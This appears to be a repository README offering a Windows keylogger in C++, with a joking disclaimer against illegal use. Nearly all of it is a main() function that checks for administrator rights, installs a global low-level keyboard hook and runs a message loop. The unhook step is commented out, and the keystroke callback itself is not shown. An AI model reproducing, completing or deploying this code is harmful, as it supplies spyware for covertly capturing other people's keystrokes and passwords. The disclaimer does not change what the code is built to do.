# key-logger
Simple key-logger method, only for windows user. many more things to finish if you want to make it perfect. Don't use it in illegal way. I'm not taking any responsibility for this btw. Don't come at me.

## Usage:
```cpp
int main(int argc, char* argv[])
{
	HANDLE _token;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &_token))
	{
		unsigned long _size;
		GetTokenInformation(_token, TokenElevation, NULL, 0, &_size);
		TOKEN_ELEVATION* _elevation = (TOKEN_ELEVATION*)malloc(_size);
		if (GetTokenInformation(_token, TokenElevation, _elevation, _size, &_size)) {
			if (!_elevation->TokenIsElevated) {
				MessageBox(NULL, L"Not running with administrator privileges.", L"UwU", MB_OK | MB_ICONWARNING);
			}
		}
		free(_elevation);
		CloseHandle(_token);
	}
    HINSTANCE hInstance = GetModuleHandle(NULL);
    if (!hInstance) {
        std::cerr << "Failed to get module handle. Error: " << GetLastError() << std::endl;
        return 1;
    }
    g_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyevent, hInstance, 0);

    if (g_keyboardHook == NULL) {
        std::cerr << "Error: " << GetLastError() << std::endl;
        return 1;
    }
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

	//// uninstall kbhook after used
 //   if (g_keyboardHook != NULL) {
 //       UnhookWindowsHookEx(g_keyboardHook);
 //   }

    while (true);

	return 0;
}
```
